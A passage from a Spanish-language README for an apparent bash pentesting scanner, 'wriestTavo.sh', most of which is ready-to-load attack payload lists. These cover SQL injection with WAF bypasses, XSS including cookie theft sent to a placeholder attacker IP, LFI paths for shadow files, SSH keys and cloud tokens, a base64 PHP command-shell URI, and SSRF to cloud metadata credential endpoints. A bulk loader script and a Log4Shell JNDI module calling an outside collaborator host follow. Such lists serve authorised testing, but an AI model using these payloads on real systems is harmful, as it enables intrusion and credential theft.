sudo ./wriestTavo.sh --add-payload "'; IF (1=1) WAITFOR DELAY '0:0:3'--" --payload-type sqli
# PostgreSQL
sudo ./wriestTavo.sh --add-payload "'; SELECT pg_sleep(3)--" --payload-type sqli
sudo ./wriestTavo.sh --add-payload "1' AND 1=(SELECT 1 FROM pg_sleep(3))--" --payload-type sqli
# Oracle
sudo ./wriestTavo.sh --add-payload "1' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',3)--" --payload-type sqli
# SQLite
sudo ./wriestTavo.sh --add-payload "1' AND LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(300000000/2))))--" --payload-type sqli

# ─── UNION Based ───────────────────────────────────────────────
sudo ./wriestTavo.sh --add-payload "' UNION SELECT 1,2,3--" --payload-type sqli
sudo ./wriestTavo.sh --add-payload "' UNION SELECT NULL,NULL,NULL--" --payload-type sqli
sudo ./wriestTavo.sh --add-payload "' UNION SELECT @@version,NULL,NULL--" --payload-type sqli
sudo ./wriestTavo.sh --add-payload "' UNION SELECT user(),database(),version()--" --payload-type sqli
sudo ./wriestTavo.sh --add-payload "' UNION SELECT table_name,NULL FROM information_schema.tables--" --payload-type sqli
sudo ./wriestTavo.sh --add-payload "' UNION SELECT username,password FROM users--" --payload-type sqli

# ─── Error-Based ───────────────────────────────────────────────
sudo ./wriestTavo.sh --add-payload "' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--" --payload-type sqli
sudo ./wriestTavo.sh --add-payload "' AND UPDATEXML(1,CONCAT(0x7e,user()),1)--" --payload-type sqli
sudo ./wriestTavo.sh --add-payload "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--" --payload-type sqli
sudo ./wriestTavo.sh --add-payload "' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--" --payload-type sqli

# ─── WAF Bypass (Bug Bounty 2024) ──────────────────────────────
sudo ./wriestTavo.sh --add-payload "'/**/OR/**/1=1--" --payload-type sqli
sudo ./wriestTavo.sh --add-payload "' /*!OR*/ 1=1--" --payload-type sqli
sudo ./wriestTavo.sh --add-payload "'/*!50000OR*/1=1--" --payload-type sqli
sudo ./wriestTavo.sh --add-payload "' oR '1'='1" --payload-type sqli
sudo ./wriestTavo.sh --add-payload "'%09OR%091=1--" --payload-type sqli
sudo ./wriestTavo.sh --add-payload "'+OR+1=1--" --payload-type sqli
sudo ./wriestTavo.sh --add-payload "'%0aOR%0a1=1--" --payload-type sqli
sudo ./wriestTavo.sh --add-payload "' OR 0x313d31--" --payload-type sqli
sudo ./wriestTavo.sh --add-payload "%27%20OR%20%271%27%3D%271" --payload-type sqli
sudo ./wriestTavo.sh --add-payload "%2527%2520OR%25201%253D1--" --payload-type sqli

# ─── JSON/API SQLi ─────────────────────────────────────────────
sudo ./wriestTavo.sh --add-payload '{"id":"1 OR 1=1--"}' --payload-type sqli
sudo ./wriestTavo.sh --add-payload '{"id":"1; SELECT SLEEP(3)--"}' --payload-type sqli
sudo ./wriestTavo.sh --add-payload '{"search":"test'"'"' UNION SELECT NULL--"}' --payload-type sqli

# ─── GraphQL SQLi ──────────────────────────────────────────────
sudo ./wriestTavo.sh --add-payload '{"query":"{user(id:\"1 OR 1=1--\"){name}}"}' --payload-type sqli
```

### XSS (~35 nuevos)

```bash
# ─── Sin comillas (WAF Bypass) ─────────────────────────────────
sudo ./wriestTavo.sh --add-payload "<svg onload=alert(1)>" --payload-type xss
sudo ./wriestTavo.sh --add-payload "<svg/onload=alert(1)>" --payload-type xss
sudo ./wriestTavo.sh --add-payload "<svg onload=alert\`1\`>" --payload-type xss
sudo ./wriestTavo.sh --add-payload "<svg onload=(alert)(1)>" --payload-type xss

# ─── HTML5 Tags menos filtradas ────────────────────────────────
sudo ./wriestTavo.sh --add-payload "<math href=javascript:alert(1)>click</math>" --payload-type xss
sudo ./wriestTavo.sh --add-payload "<keygen autofocus onfocus=alert(1)>" --payload-type xss
sudo ./wriestTavo.sh --add-payload "<marquee onstart=alert(1)>" --payload-type xss
sudo ./wriestTavo.sh --add-payload "<details open ontoggle=alert(1)>" --payload-type xss

# ─── Eventos ───────────────────────────────────────────────────
sudo ./wriestTavo.sh --add-payload "<input autofocus onfocus=alert(1)>" --payload-type xss
sudo ./wriestTavo.sh --add-payload "<select autofocus onfocus=alert(1)>" --payload-type xss
sudo ./wriestTavo.sh --add-payload "<button onclick=alert(1)>click" --payload-type xss
sudo ./wriestTavo.sh --add-payload "<div onmouseover=alert(1)>hover</div>" --payload-type xss

# ─── DOM-Based ─────────────────────────────────────────────────
sudo ./wriestTavo.sh --add-payload "<img src=1 onerror=alert(document.cookie)>" --payload-type xss
sudo ./wriestTavo.sh --add-payload "javascript:alert(document.cookie)" --payload-type xss
sudo ./wriestTavo.sh --add-payload "data:text/html,<script>alert(1)</script>" --payload-type xss
sudo ./wriestTavo.sh --add-payload "#<script>alert(1)</script>" --payload-type xss

# ─── Robo de Cookies ───────────────────────────────────────────
sudo ./wriestTavo.sh --add-payload "<script>new Image().src='http://TU-IP/?c='+document.cookie</script>" --payload-type xss
sudo ./wriestTavo.sh --add-payload "<img src=x onerror=fetch('http://TU-IP/?c='+document.cookie)>" --payload-type xss

# ─── Evasión de Codificación ───────────────────────────────────
sudo ./wriestTavo.sh --add-payload "\u003cscript\u003ealert(1)\u003c/script\u003e" --payload-type xss
sudo ./wriestTavo.sh --add-payload "%253Cscript%253Ealert(1)%253C%252Fscript%253E" --payload-type xss
sudo ./wriestTavo.sh --add-payload "<iframe src=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\">" --payload-type xss

# ─── Bypass de CSP / Angular Template Injection ────────────────
sudo ./wriestTavo.sh --add-payload "{{constructor.constructor('alert(1)')()}}" --payload-type xss
sudo ./wriestTavo.sh --add-payload "{{7*7}}" --payload-type xss
```

### LFI / Path Traversal (~40 nuevos)

```bash
# ─── Linux — Credenciales ──────────────────────────────────────
sudo ./wriestTavo.sh --add-payload "/etc/shadow" --payload-type lfi
sudo ./wriestTavo.sh --add-payload "/etc/sudoers" --payload-type lfi
sudo ./wriestTavo.sh --add-payload "/root/.bash_history" --payload-type lfi
sudo ./wriestTavo.sh --add-payload "/root/.ssh/id_rsa" --payload-type lfi
sudo ./wriestTavo.sh --add-payload "/home/www-data/.ssh/id_rsa" --payload-type lfi
sudo ./wriestTavo.sh --add-payload "/root/.ssh/authorized_keys" --payload-type lfi

# ─── Docker / Kubernetes ───────────────────────────────────────
sudo ./wriestTavo.sh --add-payload "/run/secrets/kubernetes.io/serviceaccount/token" --payload-type lfi
sudo ./wriestTavo.sh --add-payload "/var/run/secrets/kubernetes.io/serviceaccount/token" --payload-type lfi
sudo ./wriestTavo.sh --add-payload "/proc/1/environ" --payload-type lfi
sudo ./wriestTavo.sh --add-payload "/proc/net/fib_trie" --payload-type lfi
sudo ./wriestTavo.sh --add-payload "/proc/1/root/etc/passwd" --payload-type lfi

# ─── Frameworks — Archivos de Configuración ────────────────────
# Laravel
sudo ./wriestTavo.sh --add-payload "/../../../.env" --payload-type lfi
sudo ./wriestTavo.sh --add-payload "/storage/logs/laravel.log" --payload-type lfi
# WordPress
sudo ./wriestTavo.sh --add-payload "/wp-config.php" --payload-type lfi
sudo ./wriestTavo.sh --add-payload "/wp-config.php.bak" --payload-type lfi
# Django
sudo ./wriestTavo.sh --add-payload "/settings.py" --payload-type lfi
sudo ./wriestTavo.sh --add-payload "/local_settings.py" --payload-type lfi
# Rails
sudo ./wriestTavo.sh --add-payload "/config/database.yml" --payload-type lfi
sudo ./wriestTavo.sh --add-payload "/config/secrets.yml" --payload-type lfi
sudo ./wriestTavo.sh --add-payload "/config/master.key" --payload-type lfi
# Node.js
sudo ./wriestTavo.sh --add-payload "/../config/default.json" --payload-type lfi
sudo ./wriestTavo.sh --add-payload "/../package.json" --payload-type lfi
# Spring Boot
sudo ./wriestTavo.sh --add-payload "/WEB-INF/web.xml" --payload-type lfi
sudo ./wriestTavo.sh --add-payload "/../application.properties" --payload-type lfi
sudo ./wriestTavo.sh --add-payload "/../application.yml" --payload-type lfi
# ASP.NET
sudo ./wriestTavo.sh --add-payload "/Web.config" --payload-type lfi
sudo ./wriestTavo.sh --add-payload "/appsettings.json" --payload-type lfi

# ─── Windows ───────────────────────────────────────────────────
sudo ./wriestTavo.sh --add-payload "C:/Windows/repair/SAM" --payload-type lfi
sudo ./wriestTavo.sh --add-payload "C:/Windows/System32/config/SAM" --payload-type lfi
sudo ./wriestTavo.sh --add-payload "C:/inetpub/wwwroot/web.config" --payload-type lfi
sudo ./wriestTavo.sh --add-payload "..%5C..%5C..%5CWindows%5Cwin.ini" --payload-type lfi
sudo ./wriestTavo.sh --add-payload "..%255c..%255c..%255cWindows%255cwin.ini" --payload-type lfi

# ─── PHP Wrappers Avanzados ────────────────────────────────────
sudo ./wriestTavo.sh --add-payload "php://filter/convert.base64-encode/resource=config.php" --payload-type lfi
sudo ./wriestTavo.sh --add-payload "php://filter/convert.base64-encode/resource=../config.php" --payload-type lfi
sudo ./wriestTavo.sh --add-payload "php://filter/read=string.rot13/resource=config.php" --payload-type lfi
sudo ./wriestTavo.sh --add-payload "php://filter/zlib.deflate/convert.base64-encode/resource=index.php" --payload-type lfi
sudo ./wriestTavo.sh --add-payload "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NdKTs/Pg==" --payload-type lfi
# Log Poisoning
sudo ./wriestTavo.sh --add-payload "/var/log/auth.log" --payload-type lfi
sudo ./wriestTavo.sh --add-payload "/var/log/mail.log" --payload-type lfi
sudo ./wriestTavo.sh --add-payload "/usr/local/apache/log/error_log" --payload-type lfi
sudo ./wriestTavo.sh --add-payload "/proc/self/fd/2" --payload-type lfi
```

### SSRF (~35 nuevos)

```bash
# ─── Cloud Metadata ────────────────────────────────────────────
# AWS
sudo ./wriestTavo.sh --add-payload "http://169.254.169.254/latest/meta-data/iam/security-credentials/" --payload-type ssrf
sudo ./wriestTavo.sh --add-payload "http://169.254.169.254/latest/user-data/" --payload-type ssrf
sudo ./wriestTavo.sh --add-payload "http://169.254.169.254/latest/dynamic/instance-identity/document" --payload-type ssrf
# GCP
sudo ./wriestTavo.sh --add-payload "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" --payload-type ssrf
sudo ./wriestTavo.sh --add-payload "http://metadata.google.internal/computeMetadata/v1/project/project-id" --payload-type ssrf
# Azure
sudo ./wriestTavo.sh --add-payload "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" --payload-type ssrf
sudo ./wriestTavo.sh --add-payload "http://169.254.169.254/metadata/instance?api-version=2021-02-01" --payload-type ssrf
# DigitalOcean
sudo ./wriestTavo.sh --add-payload "http://169.254.169.254/metadata/v1.json" --payload-type ssrf

# ─── Servicios Internos ────────────────────────────────────────
sudo ./wriestTavo.sh --add-payload "http://kubernetes.default.svc/api/v1/namespaces" --payload-type ssrf
sudo ./wriestTavo.sh --add-payload "http://127.0.0.1:9200/_cat/indices" --payload-type ssrf    # Elasticsearch
sudo ./wriestTavo.sh --add-payload "http://127.0.0.1:6379/info" --payload-type ssrf             # Redis
sudo ./wriestTavo.sh --add-payload "http://127.0.0.1:2375/v1.41/containers/json" --payload-type ssrf  # Docker API
sudo ./wriestTavo.sh --add-payload "http://127.0.0.1:9090/api/v1/query?query=up" --payload-type ssrf  # Prometheus
sudo ./wriestTavo.sh --add-payload "http://127.0.0.1:8080/api/json" --payload-type ssrf          # Jenkins
sudo ./wriestTavo.sh --add-payload "http://127.0.0.1:8080/script" --payload-type ssrf            # Jenkins Groovy

# ─── Bypass de Filtros (blacklist de 127.0.0.1) ────────────────
sudo ./wriestTavo.sh --add-payload "http://0x7f000001/" --payload-type ssrf
sudo ./wriestTavo.sh --add-payload "http://2130706433/" --payload-type ssrf
sudo ./wriestTavo.sh --add-payload "http://127.1/" --payload-type ssrf
sudo ./wriestTavo.sh --add-payload "http://[::1]/" --payload-type ssrf
sudo ./wriestTavo.sh --add-payload "http://[::ffff:127.0.0.1]/" --payload-type ssrf
sudo ./wriestTavo.sh --add-payload "http://localhost./" --payload-type ssrf
sudo ./wriestTavo.sh --add-payload "http://localtest.me/" --payload-type ssrf
# Protocolos alternativos
sudo ./wriestTavo.sh --add-payload "dict://127.0.0.1:6379/info" --payload-type ssrf
sudo ./wriestTavo.sh --add-payload "gopher://127.0.0.1:6379/_*1%0d%0a%248%0d%0aflushall" --payload-type ssrf
sudo ./wriestTavo.sh --add-payload "file:///etc/passwd" --payload-type ssrf
# Open redirect bypass
sudo ./wriestTavo.sh --add-payload "https://target.com@169.254.169.254/" --payload-type ssrf
sudo ./wriestTavo.sh --add-payload "https://169.254.169.254#@target.com/" --payload-type ssrf
```

### Rutas / Paths (~60 nuevos)

```bash
# ─── Archivos de Entorno ───────────────────────────────────────
sudo ./wriestTavo.sh --add-payload "/.env" --payload-type paths
sudo ./wriestTavo.sh --add-payload "/.env.local" --payload-type paths
sudo ./wriestTavo.sh --add-payload "/.env.production" --payload-type paths
sudo ./wriestTavo.sh --add-payload "/.env.backup" --payload-type paths
sudo ./wriestTavo.sh --add-payload "/.env.old" --payload-type paths

# ─── Git / SVN ─────────────────────────────────────────────────
sudo ./wriestTavo.sh --add-payload "/.git/config" --payload-type paths
sudo ./wriestTavo.sh --add-payload "/.git/HEAD" --payload-type paths
sudo ./wriestTavo.sh --add-payload "/.git/refs/heads/main" --payload-type paths
sudo ./wriestTavo.sh --add-payload "/.svn/entries" --payload-type paths

# ─── Spring Boot Actuator ──────────────────────────────────────
sudo ./wriestTavo.sh --add-payload "/actuator" --payload-type paths
sudo ./wriestTavo.sh --add-payload "/actuator/env" --payload-type paths
sudo ./wriestTavo.sh --add-payload "/actuator/heapdump" --payload-type paths
sudo ./wriestTavo.sh --add-payload "/actuator/beans" --payload-type paths
sudo ./wriestTavo.sh --add-payload "/actuator/mappings" --payload-type paths
sudo ./wriestTavo.sh --add-payload "/actuator/httptrace" --payload-type paths
sudo ./wriestTavo.sh --add-payload "/actuator/logfile" --payload-type paths

# ─── Swagger / OpenAPI ─────────────────────────────────────────
sudo ./wriestTavo.sh --add-payload "/swagger-ui.html" --payload-type paths
sudo ./wriestTavo.sh --add-payload "/v2/api-docs" --payload-type paths
sudo ./wriestTavo.sh --add-payload "/v3/api-docs" --payload-type paths
sudo ./wriestTavo.sh --add-payload "/openapi.json" --payload-type paths
sudo ./wriestTavo.sh --add-payload "/openapi.yaml" --payload-type paths

# ─── GraphQL ───────────────────────────────────────────────────
sudo ./wriestTavo.sh --add-payload "/graphiql" --payload-type paths
sudo ./wriestTavo.sh --add-payload "/playground" --payload-type paths
sudo ./wriestTavo.sh --add-payload "/api/graphql" --payload-type paths

# ─── Cloud / DevOps ────────────────────────────────────────────
sudo ./wriestTavo.sh --add-payload "/.aws/credentials" --payload-type paths
sudo ./wriestTavo.sh --add-payload "/.aws/config" --payload-type paths
sudo ./wriestTavo.sh --add-payload "/terraform.tfstate" --payload-type paths
sudo ./wriestTavo.sh --add-payload "/terraform.tfvars" --payload-type paths
sudo ./wriestTavo.sh --add-payload "/docker-compose.yml" --payload-type paths
sudo ./wriestTavo.sh --add-payload "/.kube/config" --payload-type paths
sudo ./wriestTavo.sh --add-payload "/.github/workflows/deploy.yml" --payload-type paths
sudo ./wriestTavo.sh --add-payload "/.gitlab-ci.yml" --payload-type paths

# ─── Frameworks Frontend ───────────────────────────────────────
sudo ./wriestTavo.sh --add-payload "/_next/static/chunks/pages/_app.js" --payload-type paths
sudo ./wriestTavo.sh --add-payload "/_next/data/" --payload-type paths
sudo ./wriestTavo.sh --add-payload "/_nuxt/manifest.json" --payload-type paths
sudo ./wriestTavo.sh --add-payload "/@vite/client" --payload-type paths
sudo ./wriestTavo.sh --add-payload "/vite.config.js" --payload-type paths

# ─── Debug y Logs ──────────────────────────────────────────────
sudo ./wriestTavo.sh --add-payload "/phpinfo.php" --payload-type paths
sudo ./wriestTavo.sh --add-payload "/server-status" --payload-type paths
sudo ./wriestTavo.sh --add-payload "/server-info" --payload-type paths
sudo ./wriestTavo.sh --add-payload "/error_log" --payload-type paths
sudo ./wriestTavo.sh --add-payload "/storage/logs/laravel.log" --payload-type paths

# ─── Paneles de Admin ──────────────────────────────────────────
sudo ./wriestTavo.sh --add-payload "/phpmyadmin" --payload-type paths
sudo ./wriestTavo.sh --add-payload "/manager/html" --payload-type paths
sudo ./wriestTavo.sh --add-payload "/kibana" --payload-type paths
sudo ./wriestTavo.sh --add-payload "/grafana" --payload-type paths
sudo ./wriestTavo.sh --add-payload "/sonarqube" --payload-type paths
```

### ⚡ Bloque Completo — Cargar todos de una vez

```bash
#!/bin/bash
# Guardar como: cargar_payloads_modernos.sh
# Uso: bash cargar_payloads_modernos.sh
SCRIPT="./wriestTavo.sh"

echo "[*] Cargando SQLi..."
sudo $SCRIPT --add-payload "' OR 1=1 LIMIT 1 OFFSET 0--" --payload-type sqli
sudo $SCRIPT --add-payload "' OR 1=1#" --payload-type sqli
sudo $SCRIPT --add-payload "') OR ('1'='1" --payload-type sqli
sudo $SCRIPT --add-payload "1' AND (SELECT SLEEP(3))--" --payload-type sqli
sudo $SCRIPT --add-payload "'; WAITFOR DELAY '0:0:3'--" --payload-type sqli
sudo $SCRIPT --add-payload "'; SELECT pg_sleep(3)--" --payload-type sqli
sudo $SCRIPT --add-payload "' UNION SELECT @@version,NULL,NULL--" --payload-type sqli
sudo $SCRIPT --add-payload "' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--" --payload-type sqli
sudo $SCRIPT --add-payload "'/**/OR/**/1=1--" --payload-type sqli
sudo $SCRIPT --add-payload "' /*!OR*/ 1=1--" --payload-type sqli
sudo $SCRIPT --add-payload "'%09OR%091=1--" --payload-type sqli
sudo $SCRIPT --add-payload "' UNION SELECT table_name,NULL FROM information_schema.tables--" --payload-type sqli

echo "[*] Cargando XSS..."
sudo $SCRIPT --add-payload "<svg onload=alert(1)>" --payload-type xss
sudo $SCRIPT --add-payload "<svg/onload=alert(1)>" --payload-type xss
sudo $SCRIPT --add-payload "<input autofocus onfocus=alert(1)>" --payload-type xss
sudo $SCRIPT --add-payload "<details open ontoggle=alert(1)>" --payload-type xss
sudo $SCRIPT --add-payload "<math href=javascript:alert(1)>click</math>" --payload-type xss
sudo $SCRIPT --add-payload "{{constructor.constructor('alert(1)')()}}" --payload-type xss
sudo $SCRIPT --add-payload "%253Cscript%253Ealert(1)%253C%252Fscript%253E" --payload-type xss
sudo $SCRIPT --add-payload "<img src=1 onerror=alert(document.cookie)>" --payload-type xss

echo "[*] Cargando LFI..."
sudo $SCRIPT --add-payload "/etc/shadow" --payload-type lfi
sudo $SCRIPT --add-payload "/root/.ssh/id_rsa" --payload-type lfi
sudo $SCRIPT --add-payload "/var/run/secrets/kubernetes.io/serviceaccount/token" --payload-type lfi
sudo $SCRIPT --add-payload "/proc/1/environ" --payload-type lfi
sudo $SCRIPT --add-payload "php://filter/convert.base64-encode/resource=config.php" --payload-type lfi
sudo $SCRIPT --add-payload "/../../../.env" --payload-type lfi
sudo $SCRIPT --add-payload "/config/database.yml" --payload-type lfi
sudo $SCRIPT --add-payload "/WEB-INF/web.xml" --payload-type lfi
sudo $SCRIPT --add-payload "/appsettings.json" --payload-type lfi
sudo $SCRIPT --add-payload "/var/log/auth.log" --payload-type lfi

echo "[*] Cargando SSRF..."
sudo $SCRIPT --add-payload "http://169.254.169.254/latest/meta-data/iam/security-credentials/" --payload-type ssrf
sudo $SCRIPT --add-payload "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" --payload-type ssrf
sudo $SCRIPT --add-payload "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" --payload-type ssrf
sudo $SCRIPT --add-payload "http://kubernetes.default.svc/api/v1/namespaces" --payload-type ssrf
sudo $SCRIPT --add-payload "http://127.0.0.1:9200/_cat/indices" --payload-type ssrf
sudo $SCRIPT --add-payload "http://0x7f000001/" --payload-type ssrf
sudo $SCRIPT --add-payload "http://[::1]/" --payload-type ssrf
sudo $SCRIPT --add-payload "dict://127.0.0.1:6379/info" --payload-type ssrf
sudo $SCRIPT --add-payload "http://127.0.0.1:2375/v1.41/containers/json" --payload-type ssrf

echo "[*] Cargando paths..."
sudo $SCRIPT --add-payload "/.env" --payload-type paths
sudo $SCRIPT --add-payload "/.env.production" --payload-type paths
sudo $SCRIPT --add-payload "/.git/config" --payload-type paths
sudo $SCRIPT --add-payload "/actuator/env" --payload-type paths
sudo $SCRIPT --add-payload "/actuator/heapdump" --payload-type paths
sudo $SCRIPT --add-payload "/swagger-ui.html" --payload-type paths
sudo $SCRIPT --add-payload "/v3/api-docs" --payload-type paths
sudo $SCRIPT --add-payload "/terraform.tfstate" --payload-type paths
sudo $SCRIPT --add-payload "/.aws/credentials" --payload-type paths
sudo $SCRIPT --add-payload "/docker-compose.yml" --payload-type paths
sudo $SCRIPT --add-payload "/@vite/client" --payload-type paths
sudo $SCRIPT --add-payload "/graphiql" --payload-type paths

echo "[+] Listo. Verificar con: sudo ./wriestTavo.sh --show-cves"
```

### Resumen de Totales

| Tipo | En esta lista | Ya en el script | Total combinado |
|------|--------------|-----------------|----------------|
| SQLi | ~45 nuevos | 14 base | ~59 |
| XSS | ~35 nuevos | 14 base | ~49 |
| LFI | ~40 nuevos | 20 base | ~60 |
| SSRF | ~35 nuevos | 6 base | ~41 |
| Paths | ~60 nuevos | 0 (usa SecLists) | ~60 |
| **Total** | **~215 nuevos** | **54 base** | **~269** |

---

## Agregar Módulos Propios

```bash
# Los módulos custom se cargan automáticamente al existir en:
~/.wriestTavo/modules/modulo_*.sh
```

### Plantilla de módulo

```bash
#!/bin/bash
# modulo_log4shell.sh — CVE-2021-44228 Log4Shell

modulo_log4shell() {
    # Solo si Java/Spring detectado
    echo "${INTEL_TECHNOLOGIES[@]}" | grep -qi "java\|spring" || return

    log "MÓDULO CUSTOM: Log4Shell (CVE-2021-44228)"
    tip "Prueba inyección JNDI en headers HTTP."

    local out="${OUTPUT_DIR}/web/log4shell.txt"
    local collab="TU-BURP-COLLABORATOR.burpcollaborator.net"
    local proto="${WEB_PORTS[0]:-80}"
    [[ "${WEB_PORTS[0]}" == "443" ]] && proto="https" || proto="http"
    local base_url="${proto}://${TARGET}"

    # Respetar delay de WAF
    sleep "${INTEL_SCAN_DELAY:-0}"

    local payload="\${jndi:ldap://${collab}/log4shell}"
    curl -sk --max-time 10 "${base_url}" \
        -H "X-Api-Version: ${payload}" \
        -H "User-Agent: ${payload}" \
        -H "X-Forwarded-For: ${payload}" \
        >> "$out" 2>&1

    add_finding "CRÍTICO" "Log4Shell CVE-2021-44228 Potencial" \
        "Payload JNDI enviado en headers. Verificar callback en Burp Collaborator." \
        "10.0" \
        "Actualizar Log4j a 2.17.1+. Establecer log4j2.formatMsgNoLookups=true." \
        "nuclei -u ${base_url} -t cves/2021/CVE-2021-44228.yaml"
}
```

---

## Exploit Intelligence

### Módulo 43 — Automático (al final del scan)

4 búsquedas paralelas cruzadas con el stack detectado:

1. **searchsploit local** — filtra por impacto (RCE > SQLi > Auth Bypass), detecta MSF
2. **EDB online** — últimos 30 días, caché 24h, badges Verified/NEW
3. **NVD CVEs** — CVSS≥9.0 por tecnología, si CVE tiene ref a EDB → badge 🎯
4. **GHSA** — por ecosistema (composer/pip/npm/rubygems según framework)

### Módulo 44 — Manual (búsqueda interactiva)

```bash
sudo ./wriestTavo.sh TARGET
# → [44] EDB Búsqueda
# Ingresa término: "apache rce" → links directos a EDB, NVD, GHSA, MSF
```

---

## Flujo Completo de Trabajo

### Bug Bounty

```bash
# Día 1: Reconocimiento silencioso
sudo ./wriestTavo.sh --mode stealth https://target.hackerone.com
# → [2] Recon OSINT

# Día 1: Bug Bounty Pro
sudo ./wriestTavo.sh --mode stealth https://target.hackerone.com
# → [4] Bug Bounty Pro

# Agregar payloads de writeups recientes
sudo ./wriestTavo.sh --add-payload "PAYLOAD_DEL_WRITEUP" --payload-type sqli

# Día 2: Rescan con payloads nuevos
sudo ./wriestTavo.sh https://target.hackerone.com
# → [11] Custom → [13] SQLi [14] XSS [31] LFI

# Ver reportes
firefox wriestTavo_results/reporte_CLIENTE_*.html     # Para el cliente
firefox wriestTavo_results/reporte_PENTESTER_*.html   # Para el analista
```

### Pentesting Interno / AD

```bash
# Full scan + AD
sudo ./wriestTavo.sh 192.168.1.100
# → [1] Full Scan  (incluye ADPulse automáticamente al detectar LDAP/SMB)

# O solo AD audit
sudo ./wriestTavo.sh 192.168.1.10
# → [7] Windows/Infra + AD
# → Introduce credenciales de solo lectura cuando pida ADPulse

# Abrir reportes diferenciados
firefox wriestTavo_results/reporte_CLIENTE_*.html     # Para el CISO/IT
firefox wriestTavo_results/reporte_CENSURADO_*.html   # Para Dirección/Legal
firefox wriestTavo_results/reporte_PENTESTER_*.html   # Para el equipo técnico
```

### CTF / HackTheBox

```bash
sudo ./wriestTavo.sh --mode aggressive 10.10.10.X
# → [10] CTF/HTB Mode

# Ver reporte pentester inmediatamente
firefox wriestTavo_results/reporte_PENTESTER_*.html
```

---

## Comandos de Referencia Rápida

```bash
# ── ESCANEOS ──────────────────────────────────────────────────
sudo ./wriestTavo.sh IP_o_DOMINIO                    # Scan básico
sudo ./wriestTavo.sh https://app.example.com         # URL completa
sudo ./wriestTavo.sh --mode stealth target.com       # Silencioso
sudo ./wriestTavo.sh --mode aggressive 10.10.10.X    # Agresivo CTF
sudo ./wriestTavo.sh -o /tmp/mi_scan target.com      # Output custom

# ── MANTENIMIENTO ─────────────────────────────────────────────
sudo ./wriestTavo.sh --update                        # Actualizar TODO
sudo ./wriestTavo.sh --install                       # Instalar deps
sudo ./wriestTavo.sh --cron                          # Auto-update 6am
sudo ./wriestTavo.sh --show-cves                     # Ver CVEs cacheados

# ── PAYLOADS CUSTOM ───────────────────────────────────────────
sudo ./wriestTavo.sh --add-payload "PAYLOAD" --payload-type sqli
sudo ./wriestTavo.sh --add-payload "PAYLOAD" --payload-type xss
sudo ./wriestTavo.sh --add-payload "PAYLOAD" --payload-type lfi
sudo ./wriestTavo.sh --add-payload "PAYLOAD" --payload-type ssrf
sudo ./wriestTavo.sh --add-payload "PAYLOAD" --payload-type paths
nano ~/.wriestTavo/custom_payloads/sqli_extra.txt    # Editar directo

# ── REPORTES ──────────────────────────────────────────────────
firefox wriestTavo_results/reporte_CLIENTE_*.html     # Ejecutivo IT
firefox wriestTavo_results/reporte_CENSURADO_*.html   # Versión privacidad
firefox wriestTavo_results/reporte_PENTESTER_*.html   # Técnico completo
# Todos a la vez:
for f in wriestTavo_results/reporte_*.html; do firefox "$f" &; done

# ── ADPULSE ───────────────────────────────────────────────────
# Seleccionar [45] desde menú custom, [7] Windows/Infra, o [10] CTF
# Después del scan AD:
cat wriestTavo_results/active_directory/all_users.txt
cat wriestTavo_results/active_directory/kerberoastable.txt
ls wriestTavo_results/active_directory/bloodhound/

# ── EXPLOIT DATABASE ──────────────────────────────────────────
sudo searchsploit --update
searchsploit php rce
searchsploit -x 12345                                # Leer exploit
searchsploit wordpress 5.8 --json | jq

# ── NUCLEI ────────────────────────────────────────────────────
nuclei -update-templates
nuclei -l urls.txt -t cves/
nuclei -u https://target.com -severity critical,high
```

---

## Estructura de Archivos

```
wriestTavo_results/
├── nmap/
│   ├── scan_quick.nmap
│   ├── scan_version.nmap
│   └── scan_vuln.xml
├── web/
│   ├── headers_result.txt
│   ├── whatweb_result.txt
│   ├── gobuster_result.txt
│   ├── nikto_result.txt
│   ├── sqli_results.txt
│   ├── xss_results.txt
│   ├── lfi_results.txt
│   ├── ssrf_results.txt
│   ├── cors_results.txt
│   ├── cors_poc.html
│   ├── jwt_analysis.txt
│   ├── nosqli_results.txt
│   ├── xxe_results.txt
│   ├── idor_redirect.txt
│   ├── iis_windows.txt
│   ├── http_methods.txt
│   └── js_analysis.txt
├── recon/
│   ├── crtsh_subdomains.txt
│   ├── theharvester_result.txt
│   ├── dnsrecon_result.txt
│   ├── ssl_result.txt
│   ├── nuclei_result.txt
│   ├── framework_scan.txt
│   ├── infra_exposure.txt
│   └── exploit_intel.txt
├── exploits/
│   └── searchsploit_result.txt
├── active_directory/          ← NUEVO v4.1 (ADPulse)
│   ├── all_users.txt
│   ├── all_groups.txt
│   ├── all_computers.txt
│   ├── kerberoastable.txt
│   ├── inactive_accounts.txt
│   ├── gpos.txt
│   ├── adpulse_log.txt
│   └── bloodhound/
│       └── *.zip
├── reporte_TARGET_FECHA.html          ← Original
├── reporte_CLIENTE_TARGET_FECHA.html  ← NUEVO v4.1
├── reporte_CENSURADO_FECHA.html       ← NUEVO v4.1
└── reporte_PENTESTER_TARGET_FECHA.html ← NUEVO v4.1
```

```
~/.wriestTavo/
├── custom_payloads/
│   ├── sqli_extra.txt
│   ├── xss_extra.txt
│   ├── lfi_extra.txt
│   ├── ssrf_extra.txt
│   └── paths_extra.txt
├── modules/
│   └── modulo_*.sh
├── edb_cache/
├── cve_cache/
└── last_update.txt
```

---

## Preguntas Frecuentes

**¿Por qué no encuentra nada con `--mode stealth`?**
El modo stealth usa menos puertos y más delay. Para targets con WAF agresivo algunos módulos se saltan. Prueba módulos específicos con [11] Custom.

**¿Puedo correr ADPulse sin credenciales?**
ADPulse necesita credenciales de solo lectura. Puedes crear una cuenta de dominio con permisos mínimos (Domain Users es suficiente para la mayoría de checks LDAP). El check de Null Bind sí se ejecuta sin credenciales para detectar si el acceso anónimo está habilitado.

**¿Por qué se generan 4 reportes en vez de 1?**
